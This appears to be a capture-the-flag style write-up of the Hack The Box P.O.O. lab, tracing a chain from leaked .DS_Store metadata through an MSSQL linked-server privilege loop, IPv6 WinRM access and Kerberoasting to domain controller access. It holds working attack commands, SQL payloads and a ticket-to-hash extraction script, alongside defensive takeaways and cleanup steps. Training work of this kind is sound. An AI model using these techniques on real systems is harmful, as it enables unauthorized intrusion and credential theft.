---
title: "Hack The Box Mini Pro Lab — P.O.O."
summary: "P.O.O. chains exposed IIS metadata, an MSSQL linked-server trust loop, IPv6 WinRM and Kerberoasting into full Active Directory compromise."
platform: "Hack The Box"
contentType: "pro-lab"
publicationPolicy: "retired"
os: "Windows"
solvedAt: 2026-10-03
publishedAt: 2026-10-03
tags:
  - active-directory
  - iis
  - ds-store
  - mssql
  - linked-servers
  - ipv6
  - winrm
  - kerberoasting
  - lateral-movement
tools:
  - Nmap
  - curl
  - ffuf
  - Impacket
  - Evil-WinRM-Py
  - PowerShell
  - Hashcat
cves: []
htbUrl: "https://app.hackthebox.com/prolabs/11"
cover: "/images/writeups/hackthebox/pro-labs/poo/poo.jpeg"
coverAlt: "P.O.O. Mini Pro Lab artwork showing three stylized servers under a connected network dome"
featured: false
draft: false
---

> **Authorized-lab notice:** This walkthrough covers the P.O.O. Mini Pro Lab, which [Hack The Box explicitly permits for public solutions](https://help.hackthebox.com/en/articles/12325897-hack-the-box-platform-rules). Commands and credentials below apply only to that isolated lab. Flag values, personal account details and VPN addresses are omitted.

## Introduction

P.O.O. is a two-host Windows and Active Directory lab with five flags. The public entry point exposes IIS and SQL Server. A leaked `.DS_Store` file leads to database credentials; a pair of linked SQL Server instances grants an unexpected `sa` context. That access reveals an IIS credential and provides a route to the perimeter host. The final stage crosses from the local administrator account to the domain through Kerberoasting and remote administration of the domain controller.

This is a reconstruction of my solve on 3 October 2026. I include the commands, expected evidence and the failed approaches that affected the route. Replace `<LAB_SQL_PASSWORD>` with a strong password of your choice for the temporary SQL login created in this walkthrough.

## Environment and topology

| Item | Value |
| --- | --- |
| Lab | P.O.O. Mini Pro Lab |
| Entry point | `10.13.38.11` |
| Perimeter host | `COMPATIBILITY.intranet.poo` |
| Domain | `intranet.poo` (NetBIOS: `POO`) |
| Domain controller | `DC.intranet.poo` / `172.20.128.53` |
| Flags | Five; values intentionally omitted |

```text
Kali -- HTB VPN -- 10.13.38.11 (COMPATIBILITY)
                      | IIS :80, MSSQL :1433
                      | IPv6 dead:beef::1001, WinRM :5985
                      | internal 172.20.128.101/24
                      +---- 172.20.128.53 (DC.intranet.poo)
```

The lab IPs are examples from my instance. Check the entry point shown in your HTB dashboard after a reset.

## Attack path

| Stage | Evidence | Result |
| --- | --- | --- |
| Web enumeration | Root `.DS_Store` and nested `/dev/` metadata | Two project directories and a connection file |
| Database foothold | `external_user` in `poo_connection.txt` | Login to `POO_PUBLIC`; Recon flag in the file |
| Linked-server loop | `POO_PUBLIC` → `POO_CONFIG` → `POO_PUBLIC` | Return connection executes as `sa`; Huh?! flag in `flag.dbo.flag` |
| Web credential | `web.config` readable through SQL Python | IIS Basic authentication; BackTrack flag under `/admin/` |
| Host access | IPv6-only WinRM path | Local Administrator shell; Foothold flag |
| Domain enumeration | SYSTEM task queries SPNs | `p00_adm` service ticket |
| Kerberoasting | RC4 TGS cracked with keyboard-walk list | Domain credential for `p00_adm` |
| Lateral movement | WinRM from COMPATIBILITY to DC | Final flag in a domain user's Desktop |

## 1. Perimeter enumeration

Start with a complete TCP scan and then inspect the services:

```bash
mkdir -p scans
sudo nmap -Pn -n -p- -sVC -T4 -oA scans/01-services 10.13.38.11
```

The relevant ports were `80/tcp` (IIS 10.0) and `1433/tcp` (Microsoft SQL Server 2017). The SQL NTLM information disclosed the host and domain names:

```text
NetBIOS_Computer_Name: COMPATIBILITY
NetBIOS_Domain_Name: POO
DNS_Domain_Name: intranet.poo
```

The web root was the standard 703-byte IIS start page. `/admin/` returned `401` with `WWW-Authenticate: Basic realm="COMPATIBILITY"`; `/dev/` existed but denied directory listing. Those status codes established useful paths without implying that directory contents were accessible.

```bash
curl -i http://10.13.38.11/
curl -i http://10.13.38.11/admin/
curl -i http://10.13.38.11/dev/
```

A targeted file scan found an exposed macOS metadata file:

```bash
ffuf -u http://10.13.38.11/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
  -fc 404 -t 15
```

```text
.DS_Store  [Status: 200, Size: 10244]
```

I downloaded it and extracted the visible names. `strings` is sufficient for this lab, though a dedicated `.DS_Store` parser can preserve directory metadata more reliably.

```bash
curl -fsS http://10.13.38.11/.DS_Store -o scans/root.DS_Store
strings -e b -n 3 scans/root.DS_Store | sort -u
```

The names included `admin`, `dev`, `Images`, `Themes`, `Widgets` and `web.config`. The root listing was only the first layer. `/dev/.DS_Store` contained two 32-character directory names:

```bash
curl -fsS http://10.13.38.11/dev/.DS_Store -o scans/dev.DS_Store
strings -e b -n 3 scans/dev.DS_Store | sort -u
```

```text
304c0c90fbc6520610abbf378e2339d1
dca66d38fd916317687e1390a420c3fc
```

Both were real directories: requesting them without a final slash returned a `301` redirect. Their `.DS_Store` files exposed `core`, `include` and `src`. A `db/` directory also existed under each project; guessing the lab-specific `poo_*.txt` naming pattern found `poo_connection.txt`:

```bash
for project in \
  304c0c90fbc6520610abbf378e2339d1 \
  dca66d38fd916317687e1390a420c3fc; do
  curl -fsS "http://10.13.38.11/dev/$project/db/poo_connection.txt"
done
```

Both copies contained the same `POO_PUBLIC` connection details and the **Recon flag**. Keep the flag private; submit its value in HTB.

```text
SERVER=10.13.38.11
USERID=external_user
DBNAME=POO_PUBLIC
USERPWD=<PASSWORD_FROM_CONNECTION_FILE>
Flag: <REDACTED>
```

The directory name and filename were the important clues. Broad scans of every static-content directory produced noise; following the exposed metadata was faster.

## 2. MSSQL linked-server loop

Connect with the leaked SQL login. Supply the `USERPWD` value from your connection file interactively to avoid shell quoting issues:

```bash
impacket-mssqlclient external_user@10.13.38.11 -db POO_PUBLIC
```

In the SQL shell, execute each statement on **one line**. The client treats each Enter as a new query, so pasting a multiline stored-procedure call can produce misleading parameter errors.

```sql
SELECT @@SERVERNAME AS server_name, DB_NAME() AS current_db, SYSTEM_USER AS login_name;
SELECT IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin;
SELECT name, data_source, provider FROM sys.servers;
```

The starting login was `external_user`, not a server administrator. `sys.servers` showed the local `COMPATIBILITY\POO_PUBLIC` instance and a linked `COMPATIBILITY\POO_CONFIG` instance. Query the link to see the identity mapping:

```sql
SELECT * FROM OPENQUERY([COMPATIBILITY\POO_CONFIG], 'SELECT @@SERVERNAME AS server_name, SYSTEM_USER AS login_name, USER_NAME() AS db_user');
```

The first hop ran as `internal_user`. The reverse link was more interesting:

```sql
SELECT * FROM OPENQUERY([COMPATIBILITY\POO_CONFIG], 'SELECT * FROM OPENQUERY([COMPATIBILITY\POO_PUBLIC], ''SELECT @@SERVERNAME AS server_name, SYSTEM_USER AS login_name, USER_NAME() AS db_user'')');
SELECT * FROM OPENQUERY([COMPATIBILITY\POO_CONFIG], 'SELECT * FROM OPENQUERY([COMPATIBILITY\POO_PUBLIC], ''SELECT IS_SRVROLEMEMBER(''''sysadmin'''') AS is_sysadmin'')');
```

On return to `POO_PUBLIC`, SQL reported `SYSTEM_USER = sa` and `is_sysadmin = 1`. The trust mapping, rather than the initial password, was the privilege boundary failure.

Enumerating databases through that privileged path exposed a hidden `flag` database:

```sql
SELECT * FROM OPENQUERY([COMPATIBILITY\POO_CONFIG], 'SELECT * FROM OPENQUERY([COMPATIBILITY\POO_PUBLIC], ''SELECT name FROM sys.databases'')');
SELECT * FROM OPENQUERY([COMPATIBILITY\POO_CONFIG], 'SELECT * FROM OPENQUERY([COMPATIBILITY\POO_PUBLIC], ''SELECT TABLE_SCHEMA, TABLE_NAME FROM flag.INFORMATION_SCHEMA.TABLES'')');
SELECT * FROM OPENQUERY([COMPATIBILITY\POO_CONFIG], 'SELECT * FROM OPENQUERY([COMPATIBILITY\POO_PUBLIC], ''SELECT flag FROM flag.dbo.flag'')');
```

The final query returned the **Huh?! flag**. The doubled single quotes are required because the query crosses two SQL string layers.

### Creating a direct SQL administrator

For the next stage, I created a temporary lab-only SQL login through the same loop. Replace `<LAB_SQL_PASSWORD>` with your own password in the statement. `EXECUTE ... AT` permits DDL where `OPENQUERY` is awkward:

```sql
EXECUTE('EXECUTE(''CREATE LOGIN [ig_lab] WITH PASSWORD=N''''<LAB_SQL_PASSWORD>'''', CHECK_POLICY=OFF'') AT [COMPATIBILITY\POO_PUBLIC]') AT [COMPATIBILITY\POO_CONFIG];
EXECUTE('EXECUTE(''ALTER SERVER ROLE [sysadmin] ADD MEMBER [ig_lab]'') AT [COMPATIBILITY\POO_PUBLIC]') AT [COMPATIBILITY\POO_CONFIG];
```

Reconnect as `ig_lab` and confirm the intended context:

```bash
impacket-mssqlclient ig_lab@10.13.38.11 -db POO_PUBLIC
```

```sql
SELECT SYSTEM_USER AS login_name, IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin;
```

The result should be `ig_lab` and `1`. This login is only a convenience for accessing the lab SQL instance; it is not a domain account.

## 3. Reading the IIS configuration

The SQL instance had Python external scripts enabled. A single-line call read the IIS configuration file from the host:

```sql
EXEC sp_execute_external_script @language=N'Python', @script=N'print(open(r"C:\inetpub\wwwroot\web.config").read())';
```

The file contained a commented-out forms-authentication block with a cleartext credential. Record the password from your own output; it is redacted here:

```xml
<user name="Administrator" password="<PASSWORD_FROM_WEB_CONFIG>" />
```

That XML comment does not enable forms authentication. The `/admin/` endpoint itself used HTTP Basic authentication, and the same credential worked there:

```bash
curl -isS -u 'Administrator:<PASSWORD_FROM_WEB_CONFIG>' \
  http://10.13.38.11/admin/
```

The response was `200 OK` and contained the **BackTrack flag**. It also suggested that the password might work for the host's local Administrator account, which required checking a reachable management service.

## 4. IPv6 WinRM foothold

The initial IPv4 scan did not expose WinRM. A local `ipconfig` check through SQL Python showed a second useful address on the perimeter interface:

```sql
EXEC sp_execute_external_script @language=N'Python', @script=N'import subprocess; print(subprocess.check_output("ipconfig", shell=True).decode("cp437", "replace"))';
```

The host had `10.13.38.11`, an internal interface at `172.20.128.101`, and IPv6 address `dead:beef::1001`. Scan that exact address from Kali:

```bash
nmap -6 -Pn -sT -sV -p 445,3389,5985,5986 dead:beef::1001
curl -g -sv --noproxy '*' --max-time 10 \
  -o /dev/null 'http://[dead:beef::1001]:5985/wsman'
```

Port `5985` was open. A `GET /wsman` returned `405 Allow: POST`, confirming a reachable WinRM listener. Add a local hostname mapping:

```bash
printf 'dead:beef::1001 compatibility.intranet.poo\n' | sudo tee -a /etc/hosts
```

The Ruby `evil-winrm` client failed in this environment with an NTLM library `NameError`. The installed Python implementation worked when the local machine qualifier was included:

```bash
evil-winrm-py -i compatibility.intranet.poo -u 'COMPATIBILITY\Administrator'
```

Enter the password recovered from `web.config` at the prompt. An unqualified `Administrator` login did not work in my run. Once connected:

```powershell
whoami
Get-Content 'C:\Users\Administrator\Desktop\flag.txt'
```

This yielded the **Foothold flag**. `whoami` showed `compatibility\administrator`: this was local administrator access, not yet a domain administrator account.

## 5. Domain enumeration from the foothold

The member server could locate `DC.intranet.poo` at `172.20.128.53`:

```powershell
nltest /dsgetdc:intranet.poo
```

Running `setspn.exe -T intranet.poo -Q */*` directly in the local Administrator WinRM session returned an LDAP operations error. A short scheduled task running as `SYSTEM` succeeded. On a domain-joined machine, that context can authenticate to the domain with the computer account.

```powershell
$action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c "whoami > C:\Windows\Temp\poo-spn.txt & setspn.exe -T intranet.poo -Q */* >> C:\Windows\Temp\poo-spn.txt 2>&1"'
Register-ScheduledTask -TaskName 'POO-SPN-Enum' -Action $action -User 'SYSTEM' -RunLevel Highest -Force
Start-ScheduledTask -TaskName 'POO-SPN-Enum'
Start-Sleep -Seconds 10
Get-Content 'C:\Windows\Temp\poo-spn.txt'
```

Among the computer and domain-controller SPNs were two user-owned services:

```text
CN=p00_hr,CN=Users,DC=intranet,DC=poo
    HR_peoplesoft/intranet.poo:1433
CN=p00_adm,CN=Users,DC=intranet,DC=poo
    cyber_audit/intranet.poo:443
```

I focused on `p00_adm`. The `p00_hr` ticket is unnecessary for the final path.

### Requesting the service ticket without PowerView

I first uploaded PowerView and tried `Invoke-Kerberoast`, but Defender blocked the script before it loaded. Instead, I used the built-in .NET [Kerberos ticket request API](https://learn.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken.getrequest?view=netframework-4.8.1) in a small scheduled task. This requests a service ticket and writes its AP-REQ token to a file:

```powershell
Set-Content -Path 'C:\Windows\Temp\poo-ticket.ps1' -Value '$ErrorActionPreference="Stop"; Add-Type -AssemblyName System.IdentityModel; $spn="cyber_audit/intranet.poo:443"; $token=New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken($spn); [IO.File]::WriteAllBytes("C:\Windows\Temp\poo-cyber_audit.bin",$token.GetRequest())'
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\poo-ticket.ps1'
Register-ScheduledTask -TaskName 'POO-Ticket' -Action $action -User 'SYSTEM' -RunLevel Highest -Force
Start-ScheduledTask -TaskName 'POO-Ticket'
Start-Sleep -Seconds 10
Get-Item 'C:\Windows\Temp\poo-cyber_audit.bin' | Select-Object Name,Length
```

The generated token was about 1.8 KB. Download it with `evil-winrm-py`, replacing `<KALI_LAB_DIR>` with the absolute path to your Kali workspace:

```text
download C:\Windows\Temp\poo-cyber_audit.bin <KALI_LAB_DIR>/scans/poo-cyber_audit.bin
```

The token includes a GSS wrapper before the DER-encoded AP-REQ. The following Kali script locates the AP-REQ, extracts the encrypted service ticket and formats it for Hashcat. The RC4 split follows [Impacket's GetUserSPNs implementation](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py): first 16 bytes are the checksum; the rest is ciphertext.

```bash
cat > scans/ticket_to_hash.py <<'PY'
from pathlib import Path
from pyasn1.codec.der import decoder
from impacket.krb5.asn1 import AP_REQ

source = Path('scans/poo-cyber_audit.bin')
data = source.read_bytes()
ticket = None
for offset in range(min(64, len(data))):
    if data[offset] != 0x6e:
        continue
    try:
        request, remainder = decoder.decode(data[offset:], asn1Spec=AP_REQ())
        if not remainder:
            ticket = request['ticket']
            break
    except Exception:
        pass
if ticket is None:
    raise ValueError('AP-REQ not found in downloaded token')

enc = ticket['enc-part']
etype = int(enc['etype'])
cipher = enc['cipher'].asOctets()
realm = str(ticket['realm'])
spn = 'cyber_audit/intranet.poo~443'
user = 'p00_adm'

if etype == 23:
    line = f'$krb5tgs$23$*{user}${realm}${spn}*${cipher[:16].hex()}${cipher[16:].hex()}'
    mode = 13100
elif etype in (17, 18):
    line = f'$krb5tgs${etype}${user}${realm}$*{spn}*${cipher[-12:].hex()}${cipher[:-12].hex()}'
    mode = 19600 if etype == 17 else 19700
else:
    raise ValueError(f'Unexpected ticket encryption type: {etype}')

Path('scans/p00_adm.hash').write_text(line + '\n')
print(f'etype={etype}, hashcat mode={mode}')
PY
python3 scans/ticket_to_hash.py
```

In my run the ticket was RC4 (`etype 23`). Hashcat mode `13100` with SecLists' keyboard-walk list recovered the lab password:

```bash
hashcat -m 13100 -a 0 scans/p00_adm.hash \
  /usr/share/seclists/Passwords/Keyboard-Walks/Keyboard-Combinations.txt
hashcat -m 13100 scans/p00_adm.hash --show
```

```text
POO\p00_adm : <PASSWORD_RECOVERED_BY_HASHCAT>
```

If your ticket uses `etype 17` or `18`, use the mode printed by the extractor rather than `13100`. The ticket is an offline cracking target; no password guessing is sent to the DC.

## 6. Lateral movement to the domain controller

From the existing WinRM session on COMPATIBILITY, test the internal path:

```powershell
Test-NetConnection DC.intranet.poo -Port 5985 |
  Select-Object ComputerName,RemoteAddress,TcpTestSucceeded
```

The test returned `172.20.128.53` and `TcpTestSucceeded: True`. Create a credential object and run a remote command:

```powershell
$cred = [pscredential]::new('POO\p00_adm',(ConvertTo-SecureString '<PASSWORD_RECOVERED_BY_HASHCAT>' -AsPlainText -Force))
Invoke-Command -ComputerName DC.intranet.poo -Credential $cred -ScriptBlock { whoami; hostname }
```

The output confirmed `poo\p00_adm` on `DC`. The NetBIOS prefix is **`POO`**, not `INTRANET`; the latter produced Kerberos error `0x80090311` in my first attempt.

The domain Administrator's Desktop did not contain the final flag. Enumerating user profiles and Desktop contents identified the correct path:

```powershell
Invoke-Command -ComputerName DC.intranet.poo -Credential $cred -ScriptBlock {
  Get-ChildItem 'C:\Users' -Directory -Force | Select-Object FullName
  Get-ChildItem 'C:\Users\*\Desktop\*' -Force -ErrorAction SilentlyContinue |
    Select-Object FullName,Length
}
```

```text
C:\Users\mr3ks\Desktop\flag.txt
```

Read that file through the same remote session and submit the result as **p00ned** in HTB:

```powershell
Invoke-Command -ComputerName DC.intranet.poo -Credential $cred -ScriptBlock {
  Get-Content 'C:\Users\mr3ks\Desktop\flag.txt'
}
```

The flag value is deliberately omitted from this article.

## What did not work

| Attempt | Result | Adjustment |
| --- | --- | --- |
| Broad file scans beneath `/dev/` | No useful names from generic wordlists | Followed nested `.DS_Store` metadata and the `poo_*.txt` pattern |
| Multiline SQL procedure pasted into Impacket's shell | Each Enter was sent as a separate query | Put each T-SQL statement on one line |
| `xp_cmdshell` or Python `subprocess` for host commands | SQL shell stalled or lost its prompt context | Used the stable WinRM session for host operations |
| Ruby `evil-winrm` | Local NTLM library error | Used `evil-winrm-py` and the qualified local username |
| SPN query as local Administrator | LDAP operations error | Ran `setspn` as `SYSTEM` in a scheduled task |
| Importing PowerView | Defender blocked the file | Requested tickets with the built-in .NET Kerberos API |
| `INTRANET\p00_adm` for DC WinRM | Kerberos domain unavailable error | Used the actual NetBIOS domain: `POO\p00_adm` |

## Lessons learned

- Directory metadata can disclose names even when IIS denies directory listing. Follow discovered structure instead of relying only on large wordlists.
- SQL linked-server permissions are directional. A low-privilege first hop can return through a reverse mapping with much higher rights.
- Enumerate IPv6 and alternate interfaces on a foothold. A service hidden from the IPv4 perimeter may still be reachable through the VPN's IPv6 route.
- Separate local and domain identities. The IIS credential opened the perimeter host; the domain move required a distinct `p00_adm` credential.
- When a known offensive framework is blocked, native APIs can demonstrate the same underlying authentication behavior with less dependency on a large script.
- The final flag was in a different user's profile, so checking only `Administrator\Desktop` would miss it.

## Defensive takeaways

| Weakness | Defensive action |
| --- | --- |
| Exposed `.DS_Store` and connection files | Remove development metadata from deployments; prevent direct access to configuration files |
| Plaintext SQL password in a web path | Move secrets to a managed store; use least-privileged service identities and rotate exposed credentials |
| SQL linked-server loop mapped to `sa` | Audit reciprocal links, login mappings and RPC permissions; remove privileged default mappings |
| Web credential in `web.config` comment | Remove obsolete secrets from source and configuration history; rotate the affected account |
| IPv6 WinRM reachable externally | Apply equivalent IPv4 and IPv6 firewall rules; restrict management ports to trusted networks |
| Crackable SPN account password | Use long random service passwords or gMSAs; monitor unusual TGS requests |
| Domain admin remote access from a member server | Limit privileged logon paths, enforce administrative tiers and require strong authentication |

## Cleanup

After recording the required evidence, remove the lab artifacts on COMPATIBILITY:

```powershell
Unregister-ScheduledTask -TaskName 'POO-SPN-Enum' -Confirm:$false -ErrorAction SilentlyContinue
Unregister-ScheduledTask -TaskName 'POO-Ticket' -Confirm:$false -ErrorAction SilentlyContinue
Remove-Item 'C:\Windows\Temp\poo-spn.txt','C:\Windows\Temp\poo-ticket.ps1','C:\Windows\Temp\poo-cyber_audit.bin' -Force -ErrorAction SilentlyContinue
```

If you created the `ig_lab` SQL login, drop it after finishing the lab. Remove the local `/etc/hosts` entry when you no longer need the IPv6 hostname. Keep personal notes and proof of completion outside any public repository.

## References

- [Hack The Box — P.O.O. Mini Pro Lab](https://app.hackthebox.com/prolabs/11)
- [Hack The Box platform rules: content sharing](https://help.hackthebox.com/en/articles/12325897-hack-the-box-platform-rules)
- [Microsoft: Kerberos ticket request API](https://learn.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken.getrequest?view=netframework-4.8.1)
- [Microsoft: `Invoke-Command`](https://learn.microsoft.com/powershell/module/microsoft.powershell.core/Invoke-Command)
- [Impacket: GetUserSPNs hash formatting](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)
- [SecLists: Keyboard-Combinations](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Keyboard-Walks/Keyboard-Combinations.txt)
- [Return to the Pro Labs archive](/writeups/pro-labs/)
